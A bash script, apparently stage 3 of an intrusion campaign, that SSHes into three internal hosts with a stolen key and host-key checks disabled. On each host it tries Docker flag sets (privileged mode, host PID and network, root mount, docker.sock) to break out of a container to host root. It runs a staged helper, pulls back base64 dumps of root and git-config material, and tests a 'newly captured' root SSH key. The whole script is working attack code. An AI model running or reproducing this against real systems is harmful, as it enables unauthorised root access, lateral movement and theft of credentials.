#!/usr/bin/env bash
# i14987 stage 3: on 10.17.1.3/.4/.6 (where the privileged helper container is
# refused) diagnose the docker denial, re-run ONE helper container with the best
# working flag set, and test the newly captured root@node001 key per host.
set +e
TS=$(date +%s)
D=/tmp/i14987r3-$TS
mkdir -p "$D"; chmod 700 "$D"
SELFDIR=$(cd "$(dirname "$0")" && pwd)
echo "===I14987R3_START $(date -u +%Y-%m-%dT%H:%M:%SZ)==="
id; hostname
cp -f "$SELFDIR/i14987_helper.sh" "$D/i14987_helper.sh"
cp -f "$SELFDIR/i14987_host_probe.py" "$D/i14987_host_probe.py"
printf '%s\n' "$I14987_A8432_K2" > "$D/k2"; chmod 600 "$D/k2"
printf '%s\n' "$I14987_ROOTK" > "$D/rootk"; chmod 600 "$D/rootk"
echo "===I14987R3_KEYS k2=$(sha256sum "$D/k2" | cut -d' ' -f1) rootk=$(sha256sum "$D/rootk" | cut -d' ' -f1)"
SSHOPTS="-o IdentitiesOnly=yes -o BatchMode=yes -o ConnectTimeout=12 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"
tar czf "$D/stage.tgz" -C "$D" i14987_helper.sh i14987_host_probe.py 2>&1
echo "STAGE_TGZ size=$(wc -c < "$D/stage.tgz")"

read_files() {  # $1 host, $2 subdir
  timeout 240 ssh -i "$D/k2" $SSHOPTS github@"$1" "SUBDIR='$2' bash -s" <<'EOS' 2>&1
set +e
DIR="$HOME/$SUBDIR"
echo "===I14987_DIR $DIR==="
ls -la "$DIR" 2>&1 | head -40
for f in self_host.txt helper3_id.txt run.log rootmat_b64.txt root_probe.out root_probe.err gitcfg_b64.txt gpu.txt; do
  if [ -f "$DIR/$f" ]; then
    SZ=$(wc -c < "$DIR/$f" 2>/dev/null); SHA=$(sha256sum "$DIR/$f" 2>/dev/null | cut -d' ' -f1)
    if [ -z "$SZ" ]; then echo "===I14987_FILE $f UNREADABLE==="; continue; fi
    echo "===I14987_FILE $f size=$SZ sha256=$SHA START==="
    head -c 2000000 "$DIR/$f" | base64 -w0
    echo
    echo "===I14987_FILE $f END==="
  else
    echo "===I14987_FILE $f MISSING==="
  fi
done
echo "===I14987_READ_OK $DIR==="
EOS
}

pick_image() {  # $1 host
  IMG=""
  for CAND in $(timeout 60 ssh -i "$D/k2" $SSHOPTS github@"$1" "docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | grep -iE 'vllm|sglang|dtk|rocky|ubuntu|debian|centos|kylin|pytorch|runner' | head -8" 2>/dev/null) \
              $(timeout 60 ssh -i "$D/k2" $SSHOPTS github@"$1" "docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -6" 2>/dev/null); do
    if timeout 60 ssh -i "$D/k2" $SSHOPTS github@"$1" "timeout 30 docker run --name i14987t -e X=1 --entrypoint /bin/sh '$CAND' -c 'command -v python3' >/dev/null 2>&1; rc=\$?; docker container rm i14987t >/dev/null 2>&1; exit \$rc"; then
      IMG="$CAND"; break
    fi
  done
  echo "$IMG"
}

diag() {  # $1 host, $2 image, $3 flags, $4 name
  timeout 70 ssh -i "$D/k2" $SSHOPTS github@"$1" "timeout 45 docker run --name '$4' -v \$HOME/i14987p2:/out $3 --entrypoint /bin/sh '$2' -c 'id 2>&1; (echo p > /out/probe.txt && echo I14987D_OK) 2>&1; (test -f /host/etc/hostname && echo I14987D_HOST) 2>&1; ls /host 2>&1 | head -3'; rc=\$?; docker container rm '$4' >/dev/null 2>&1; exit \$rc" 2>&1
}

A_FLAGS="--user 0:0 --pid=host --network=host -v /:/host:ro -v /var/run/docker.sock:/var/run/docker.sock"
B_FLAGS="--privileged --pid=host --network=host -v /:/host:ro -v /var/run/docker.sock:/var/run/docker.sock"
C_FLAGS="--user 0:0 -v /:/host:ro"

for H in 10.17.1.3 10.17.1.4 10.17.1.6; do
  echo "===I14987R3_HOST $H $(date -u +%H:%M:%SZ)==="
  timeout 180 ssh -i "$D/k2" $SSHOPTS github@"$H" 'mkdir -p $HOME/i14987p2 && tar xzf - -C $HOME/i14987p2 && chmod 755 $HOME/i14987p2/i14987_helper.sh && echo STAGE_OK' < "$D/stage.tgz" 2>&1
  IMG=$(pick_image "$H")
  echo "===I14987R3_IMG $H $IMG==="
  PICK=""
  if [ -n "$IMG" ]; then
    for LBL in A B C; do
      case $LBL in A) FL="$A_FLAGS";; B) FL="$B_FLAGS";; C) FL="$C_FLAGS";; esac
      OUT=$(diag "$H" "$IMG" "$FL" "i14987d$LBL"); RC=$?
      echo "===I14987R3_DIAG $H $LBL rc=$RC :: $(echo "$OUT" | tr '\n' '|' | head -c 400)==="
      case "$OUT" in
        *I14987D_OK*I14987D_HOST*) [ -z "$PICK" ] && PICK="$FL" ;;
      esac
    done
  fi
  echo "===I14987R3_PICK $H [$PICK]==="
  if [ -n "$PICK" ] && [ -n "$IMG" ]; then
    timeout 1100 ssh -i "$D/k2" $SSHOPTS github@"$H" "timeout 900 docker run --name i14987p2 $PICK -v \$HOME/i14987p2:/out --entrypoint /bin/sh '$IMG' /out/i14987_helper.sh > \$HOME/i14987p2/run.log 2>&1; echo HELPER_RC=\$? >> \$HOME/i14987p2/run.log; docker container rm i14987p2 >/dev/null 2>&1; echo ===I14987R3_HELPER_DONE===" 2>&1
    echo "RUN_RC=$?"
    read_files "$H" i14987p2
  fi
  echo "===I14987R3_ROOTSSH $H $(date -u +%H:%M:%SZ)==="
  ROUT=$(timeout 60 ssh -i "$D/rootk" $SSHOPTS root@"$H" 'echo I14987_ROOTOK; id; hostname; (hy-smi 2>&1 || /opt/hyhal/bin/hy-smi 2>&1) | head -12' 2>&1)
  RRC=$?
  echo "===I14987R3_ROOTSSH_RC $H $RRC==="
  echo "$ROUT" | head -30
  echo "===I14987R3_HOST_END $H==="
done
echo "===I14987R3_DONE $(date -u +%Y-%m-%dT%H:%M:%SZ)==="
exit 1
